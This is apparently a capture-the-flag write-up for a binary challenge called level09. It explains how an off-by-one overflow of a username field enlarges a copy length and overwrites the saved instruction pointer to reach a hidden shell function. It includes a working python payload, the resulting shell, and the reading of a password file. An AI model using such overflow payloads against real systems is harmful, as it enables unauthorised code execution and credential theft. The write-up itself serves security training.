# level09

As we can see, there's an unused function called `secret_backdoor()` that calls a shell.  
We have to fuind a way to call it.  

We know that `t_save::username[40]`, and as we can see in `set_username()`,
there's a copy of the `41` bytes.  
**We can therefore overflow that byte.**  

Interestingly, this 41th byte corresponds to `t_save::len` which is used in the
`strncpy()` in `set_msg()`.  
So, we can increase the length in the copy to reach the `eip` and call `secret_backdoor()`.  

We find 2 things :
- `secret_backdoor()` address -> `0x000055555555488c`
- `eip` offset -> `208` (`0xd0` in hex)


**We can now create our payload :**

```sh
$> (python -c 'print("A"*40 + "\xd0"); print("A"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
[...]
$ cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
